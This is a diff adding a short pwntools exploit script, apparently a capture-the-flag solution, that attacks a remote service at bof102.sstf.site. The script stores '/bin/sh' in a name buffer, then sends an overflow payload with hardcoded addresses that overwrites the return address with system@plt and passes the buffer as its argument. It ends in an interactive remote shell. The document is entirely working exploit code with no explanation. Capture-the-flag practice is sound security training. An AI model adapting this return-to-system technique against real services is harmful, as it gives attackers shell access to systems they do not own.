@@ -1,0 +1,23 @@
+from pwn import *
+
+r = remote("bof102.sstf.site", 1337)
+
+pop_ret = 0x0804864b
+system_plt = 0x80483e0
+name = 0x804a034
+
+payload  = b""
+payload += b"a" * 0x10
+payload += b"b" * 0x4
+payload += p32(system_plt)
+payload += b"c" * 0x4
+payload += p32(name)
+
+
+r.sendlineafter("Name > ", "/bin/sh")
+
+r.sendlineafter(" > ", payload)
+
+
+
+r.interactive()
